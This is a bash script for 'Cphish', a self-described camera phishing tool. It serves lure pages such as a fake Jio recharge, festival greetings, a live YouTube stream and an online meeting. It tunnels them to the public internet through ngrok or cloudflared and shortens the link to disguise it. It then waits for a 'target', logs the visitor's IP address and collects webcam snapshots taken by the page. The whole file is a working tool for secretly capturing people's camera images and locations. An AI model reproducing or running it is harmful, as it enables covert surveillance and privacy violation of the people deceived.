#!/bin/bash

# Cphish 
# Version    : 1.2.3
# Description: Cphish is a camera Phishing tool.
# Author     : Sajid Ibn Nayeem
# Github     : https://github.com/SajidIbnNayeem


# Colors

black="\033[1;30m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
purple="\033[1;35m"
cyan="\033[1;36m"
violate="\033[1;37m"
white="\033[0;37m"
nc="\033[00m"

# Output snippets
info="${red}[${white}+${red}] ${cyan}"
ask="${red}[${white}?${red}] ${violate}"
error="${cyan}[${white}!${cyan}] ${red}"
success="${red}[${white}√${red}] ${green}"


cwd=`pwd`

# Logo 
logo="    
${yellow}                     
${yellow}        █▀▀ █▀█ █░█ █ █▀ █░█ ${red}v1.2.3
${yellow}        █▄▄ █▀▀ █▀█ █ ▄█ █▀█ 


${blue} ➤ Tool Created by Sajid Ibn Nayeem ${red}
"

# Package Installer
pacin(){
    if $sudo && $pacman; then
        sudo pacman -S $1 --noconfirm
    fi
}

# Kill running instances of required packages
killer() {
if [ `pidof php > /dev/null 2>&1` ]; then
    killall php
fi
if [ `pidof ngrok > /dev/null 2>&1` ]; then
    killall ngrok
fi
if [ `pidof cloudflared > /dev/null 2>&1` ]; then
    killall cloudflared
fi
if [ `pidof curl > /dev/null 2>&1` ]; then
    killall curl
fi
if [ `pidof wget > /dev/null 2>&1` ]; then
    killall wget
fi
if [ `pidof unzip > /dev/null 2>&1` ]; then
    killall unzip
fi
}

# Check if offline
netcheck() {
    while true; do
        wget --spider --quiet https://github.com
        if [ "$?" != 0 ]; then
            echo -e "${error}No internet!\007\n"
            sleep 2
        else
            break
        fi
    done
}

# Set template
replacer() {
    while true; do
    if echo $option | grep -q "1"; then
        sed "s+forwarding_link+"$1"+g" grabcam.html > index2.html
        sed "s+forwarding_link+"$1"+g" template.php > index.php
        break
    elif echo $option | grep -q "2"; then
        sed "s+forwarding_link+"$1"+g" template.php > index.php
        sed "s+forwarding_link+"$1"+g" festivalwishes.html > index3.html
        sed "s+fes_name+"$fest_name"+g" index3.html > index2.html
        rm -rf index3.html
        break
    elif echo $option | grep -q "3"; then
        sed "s+forwarding_link+"$1"+g" template.php > index.php
        sed "s+forwarding_link+"$1"+g" LiveYTTV.html > index3.html
        sed "s+live_yt_tv+"$vid_id"+g" index3.html > index2.html
        rm -rf index3.html
        break
    elif echo $option | grep -q "4"; then
        sed "s+forwarding_link+"$1"+g" template.php > index.php
        sed "s+forwarding_link+"$1"+g" OnlineMeeting.html > index2.html
        break
    fi
    done
    sleep 1
    echo -e "${yellow}➤${blue} Link  : ${1}\n"
    sleep 1
    echo -e "${yellow}✋ Please Wait a few minute PHP is Starting..... "
    netcheck
    masked=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${1})
    if ! [[ -z $masked ]]; then
        echo -e "${success}URL 2 > ${masked}\n"
        
    fi
}

# Prevent ^C
stty -echoctl

# Detect UserInterrupt
trap "echo -e ' \n ${yellow}🤩 Thanks for Using!...\n Your Star Can Help This Project Reach More People!\n If You Like Cphish,\n Give it a Star! '; exit" 2

# Termux
if [[ -d /data/data/com.termux/files/home ]]; then
termux-fix-shebang Cphish.sh
termux=true
else
termux=false
fi

# Workdir
if $termux; then
if ! [ -d /sdcard/Pictures ]; then
cd /sdcard && mkdir Pictures
fi
export FOL="/sdcard/Pictures"
cd "$FOL"
if ! [[ -e ".temp" ]]; then 
touch .temp  || (termux-setup-storage && echo -e "\n${error}Please Restart Termux!\n\007" && sleep 5 && exit 0)
fi
cd "$cwd"
else
if [ -d "$HOME/Pictures" ]; then
export FOL="$HOME/Pictures"
else
export FOL="$cwd"
fi
fi

# Set Tunneler
export TN="Cloudflared"

# Set Package Manager
if [ `command -v sudo` ]; then
    sudo=true
else
    sudo=false
fi
if $sudo; then
if [ `command -v apt` ]; then
    pac_man="sudo apt"
elif  [ `command -v apt-get` ]; then
    pac_man="sudo apt-get"
elif  [ `command -v yum` ]; then
    pac_man="sudo yum"
elif [ `command -v dnf` ]; then
    pac_man="sudo dnf"
elif [ `command -v apk` ]; then
    pac_man="sudo apk"
elif [ `command -v pacman` ]; then
    pacman=true
else
    echo -e "${error}No supported package manager found! Install packages manually!\007\n"
    exit 1
fi
else
if [ `command -v apt` ]; then
    pac_man="apt"
elif [ `command -v apt-get` ]; then
    pac_man="apt-get"
elif [ `command -v brew` ]; then
    pac_man="brew"
else
    echo -e "${error}No supported package manager found! Install packages manually!\007\n"
    exit 1
fi
fi

# Download tunnlers
if ! [[ -f $HOME/.ngrokfolder/ngrok && -f $HOME/.cffolder/cloudflared ]] ; then
    if ! [[ -d $HOME/.ngrokfolder ]]; then
        cd $HOME && mkdir .ngrokfolder
    fi
    if ! [[ -d $HOME/.cffolder ]]; then
        cd $HOME && mkdir .cffolder
    fi
    p=`uname -m`
    d=`uname`
    while true; do
        echo -e "\n${white}Tool Created by Sajid Ibn Nayeem  \n"
        netcheck
        if [ -e ngrok.zip ];then
            rm -rf ngrok.zip
        fi
        cd "$cwd"
        if echo "$d" | grep -q "Darwin"; then
            if echo "$p" | grep -q "x86_64"; then
                wget -q --show-progress "https://github.com/SajidIbnNayeem/filess/blob/main/ngrok/ngrok-stable-darwin-amd64.zip" -O "ngrok.zip"
                ngrokdel
                wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz" -O "cloudflared.tgz"
                tar -zxf cloudflared.tgz > /dev/null 2>&1
                rm -rf cloudflared.tgz
                break
            elif echo "$p" | grep -q "arm64"; then
                wget -q --show-progress "https://github.com/SajidIbnNayeem/filess/blob/main/ngrok/ngrok-stable-arm64.zip" -O "ngrok.zip"
                ngrokdel
                echo -e "${error}Cloudflared not available for device architecture!"
                sleep 3
                break
            else
                echo -e "${error}Device architecture unknown. Download ngrok/cloudflared manually!"
                sleep 3
                break
            fi
        elif echo "$d" | grep -q "Linux"; then
            if echo "$p" | grep -q "aarch64"; then
                if [ -e ngrok-stable-linux-arm64.tgz ];then
                   rm -rf ngrok-stable-linux-arm64.tgz
                fi
                wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" -O "cloudflared"
                break
            elif echo "$p" | grep -q "arm"; then
                wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' -O "cloudflared"
                break
            elif echo "$p" | grep -q "x86_64"; then
                wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' -O "cloudflared"
                break
            else
                wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" -O "cloudflared"
                break
            fi
        else
            echo -e "${error}Unsupported Platform!"
            exit
        fi
    done
    sleep 1
    cd "$cwd"
    mv -f cloudflared $HOME/.cffolder
    if $sudo; then
    sudo chmod +x $HOME/.cffolder/cloudflared
    else
    chmod +x $HOME/.cffolder/cloudflared
    fi
fi


# Start Point
while true; do
clear
echo -e "$logo"
echo -e "
${yellow}[${white}1${yellow}] ${red}Jio Recharge

${yellow}[${white}2${yellow}] ${red}Festival

${yellow}[${white}3${yellow}] ${red}Live Youtube

${yellow}[${white}4${yellow}] ${red}Online Meeting

${yellow}[${white}x${yellow}] ${red}About
"

printf "${yellow}[${white}★★${yellow}] Select an option : ${blue}"
read option
# Select template
    if echo $option | grep -q "1"; then
        dir="jio"
        break
    elif echo $option | grep -q "2"; then
        dir="fest"
        printf "${yellow}[${white}★★${yellow}] Enter festival name:${blue}"
        read fest_name
        if [ -z $fest_name ]; then
            echo -e "\n${error}Invalid input!\n\007"
            sleep 1
        else
            fest_name="${fest_name//[[:space:]]/}"
            break
        fi
    elif echo $option | grep -q "3"; then
        dir="live"
        printf "${yellow}[${white}★★${yellow}]Enter  youtube video ID: ${blue}"
        read vid_id
        if [ -z $vid_id ]; then
            echo -e "\n${error}Invalid input!\n\007"
            sleep 1
        else
            break
        fi
    elif echo $option | grep -q "4"; then
        dir="om"
        break
    elif echo $option | grep -q "t"; then
        if [ $TN == "Cloudflared" ]; then
            export TN="Ngrok"
        else
            export TN="Cloudflared"
        fi
    elif echo $option | grep -q "i"; then
        printf "${yellow}[${white}★★${yellow}]Enter  Directory: ${blue}"
        read dire
        if ! [ -d $dire ]; then
            echo -e "\n${error}Invalid directory!\n\007"
        else
            export FOL="$dire"
            echo -e "\n${success}Directory changed successfully!\n"
        fi
    elif echo $option | grep -q "x"; then
        clear
        echo -e "$logo"
        echo -e "$yellow[ToolName]  ${green}  :  [Cphish]
$yellow[Version]    ${green} :  [1.2.3]
$yellow[Description]${green} :  [Camera Phishing tool]
$yellow[Author]     ${green} :  [Sajid Ibn Nayeem]
$yellow[Github]     ${green} :  [https://github.com/SajidIbnNayeem]"

printf "${red} \n ×͜× Press Enter ${blue}"
read about
    
    elif echo $option | grep -q "0"; then
        exit 0
    else
        echo -e "\n${error}Invalid input!\007"
        sleep 1
    fi 

done
cd $cwd
if [ -e websites.zip ];then
unzip websites.zip > /dev/null 2>&1
rm -rf websites.zip
fi
if ! [ -d $dir ];then
mkdir $dir
cd $dir
netcheck
wget -q --show-progress "https://github.com/SajidIbnNayeem/files/raw/main/${dir}.zip"
unzip ${dir}.zip > /dev/null 2>&1
rm -rf ${dir}.zip
else
cd $dir
fi 

# Hotspot required for termux
if $termux; then
echo -e "\n${info}If you haven't turned on hotspot, please enable it!"
sleep 3
fi
echo -e "\n${yellow}[${white}+${yellow}]${blue} Starting PHP Server at 127.0.0.1:7777\n"
netcheck
php -S 127.0.0.1:7777 > /dev/null 2>&1 &
sleep 2
echo -e "${yellow}[${white}+${yellow}]${blue} Starting link tunnelers......\n"
if [ -e "$HOME/.cffolder/log.txt" ]; then
rm -rf "$HOME/.cffolder/log.txt"
fi
netcheck
cd $HOME/.ngrokfolder && ./ngrok http 127.0.0.1:7777 > /dev/null 2>&1 &
if $termux; then
cd $HOME/.cffolder && termux-chroot ./cloudflared tunnel -url "127.0.0.1:7777" --logfile "log.txt" > /dev/null 2>&1 &
else
cd $HOME/.cffolder && ./cloudflared tunnel -url "127.0.0.1:7777" --logfile "log.txt" > /dev/null 2>&1 &
fi
sleep 8
ngroklink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
if (echo "$ngroklink" | grep -q "ngrok"); then
ngrokcheck=true
else
ngrokcheck=false
fi
cflink=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "$HOME/.cffolder/log.txt")
if (echo "$cflink" | grep -q "cloudflare"); then
cfcheck=true
else
cfcheck=false
fi
while true; do
if ( $cfcheck && $ngrokcheck ); then
    if [ $TN == "Cloudflared" ]; then
        echo -e "${success}Cloudflared choosen!\n"
        replacer "$cflink"
    else
        echo -e "${success}Ngrok choosen!\n"
        replacer "$ngroklink"
    fi
    break
fi
if ( $cfcheck &&  ! $ngrokcheck ); then
    echo -e "${yellow}[${white}√${yellow}] Cloudflared started succesfully!\n"
    replacer "$cflink"
    break
fi
if ( ! $cfcheck && $ngrokcheck ); then
    echo -e "${yellow}[${white}√${yellow}] Ngrok started succesfully!\n"
    replacer "$ngroklink"
    break
fi
if ! ( $cfcheck && $ngrokcheck ); then
    echo -e "${error}Tunneling failed!\n"
    killer; exit 1
fi
done
sleep 1
status=$(curl -s --head -w %{http_code} 127.0.0.1:7777 -o /dev/null)
if echo "$status" | grep -q "404"; then
    echo -e "${error}PHP couldn't start!\n\007"
    killer; exit 1
else
    echo -e "${yellow}[${white}√${yellow}] PHP started succesfully!\n"
fi
rm -rf ip.txt
echo -e "${yellow}[${white}+${yello}]${blue} Waiting for target. ${blue}Press ${red}Ctrl + C ${blue}to exit...\n"
while true; do
    if [[ -e "ip.txt" ]]; then
        echo -e "\007${yellow}[${white}√${yellow} Target opened the link!\n"
        while IFS= read -r line; do
            echo -e "${green}[${blue}*${green}]${yellow} $line"
        done < ip.txt
        echo ""
        cat ip.txt >> $cwd/ips.txt
        rm -rf ip.txt
    fi
    if [[ -e "log.txt" ]]; then
        echo -e "\007${yellow}[${white}√${yellow} IMAGE FILE RECEIVED ! Download...\n"
        file=`ls | grep png`
        mv -f $file $FOL
        rm -rf log.txt
    fi
done 
